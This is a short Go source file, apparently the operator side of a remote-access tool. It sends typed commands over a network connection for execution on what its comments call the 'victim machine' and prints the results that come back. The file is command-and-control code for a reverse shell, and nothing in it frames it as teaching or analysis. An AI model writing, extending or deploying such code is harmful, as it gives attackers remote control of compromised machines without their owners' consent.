package executecommands

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
)

type Command struct {
	CmdOutput string
	CmdError  string
}

func ExecuteRemoteCommand(connection net.Conn) error {
	// send commands from server
	// execute it on victim machine
	// get the results back
	// typical commands: dir, pwd, ls, whoami
	// exiting command will be "stop"

	reader := bufio.NewReader(os.Stdin)

	command_loop := true

	for command_loop {
		fmt.Print(">> ")
		command, err := reader.ReadString('\n')

		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(command))

		if command == "stop\n" {
			command_loop = false
			continue
		}

		cmdStruct := &Command{}

		decoder := gob.NewDecoder(connection)

		decoder.Decode(cmdStruct)

		if cmdStruct.CmdError != "" {
			fmt.Println(cmdStruct.CmdError)
		} else {
			fmt.Println(cmdStruct.CmdOutput)
		}
	}
	return nil
}
